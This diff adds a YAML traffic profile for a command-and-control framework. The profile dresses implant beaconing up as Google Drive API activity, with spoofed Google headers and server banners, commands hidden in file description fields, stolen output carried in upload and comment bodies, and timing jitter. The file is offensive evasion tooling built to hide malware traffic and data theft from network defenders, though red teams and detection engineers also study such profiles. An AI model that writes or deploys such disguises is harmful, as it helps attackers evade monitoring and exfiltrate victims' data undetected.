@@ -1,0 +1,85 @@
+# Google Services Malleable Profile
+# Disguises C2 traffic as Google Drive/Workspace activity
+
+name: "google"
+description: "Google Workspace and Drive traffic disguise"
+
+http_get:
+  uri:
+    - "/drive/v3/files"
+    - "/drive/v3/files/{file_id}"
+    - "/drive/v3/files/{file_id}/revisions"
+  verb: "GET"
+
+  client:
+    headers:
+      Accept: "application/json"
+      Accept-Encoding: "gzip, deflate, br"
+      Accept-Language: "en-US,en;q=0.9"
+      Authorization: "Bearer {access_token}"
+      Connection: "keep-alive"
+      Host: "www.googleapis.com"
+      User-Agent: "google-api-python-client/2.100.0 (gzip)"
+      X-Goog-Api-Client: "gl-python/3.11.0 gdcl/2.100.0"
+      X-Goog-AuthUser: "0"
+    metadata:
+      encoding:
+        - base64url
+      location: "uri"
+      parameter: "pageToken"
+
+  server:
+    headers:
+      Alt-Svc: "h3=\":443\"; ma=2592000"
+      Cache-Control: "private, max-age=0, must-revalidate"
+      Content-Type: "application/json; charset=UTF-8"
+      Server: "ESF"
+      Vary: "Origin, X-Origin"
+      X-Content-Type-Options: "nosniff"
+      X-Frame-Options: "SAMEORIGIN"
+      X-XSS-Protection: "0"
+    output:
+      encoding:
+        - base64url
+      container: "json"
+      path: "files[0].description"
+
+http_post:
+  uri:
+    - "/upload/drive/v3/files"
+    - "/drive/v3/files/{file_id}/comments"
+  verb: "POST"
+
+  client:
+    headers:
+      Accept: "application/json"
+      Authorization: "Bearer {access_token}"
+      Content-Type: "application/json"
+      X-Upload-Content-Type: "application/octet-stream"
+    id:
+      encoding:
+        - base64url
+      location: "uri"
+      parameter: "file_id"
+    output:
+      encoding:
+        - gzip
+        - base64url
+      location: "body"
+      container: "json"
+      path: "properties.data"
+
+  server:
+    headers:
+      Content-Type: "application/json"
+      Server: "ESF"
+    output:
+      encoding:
+        - base64url
+      container: "json"
+      path: "id"
+
+jitter:
+  min: 20
+  max: 45
+  percent: 30
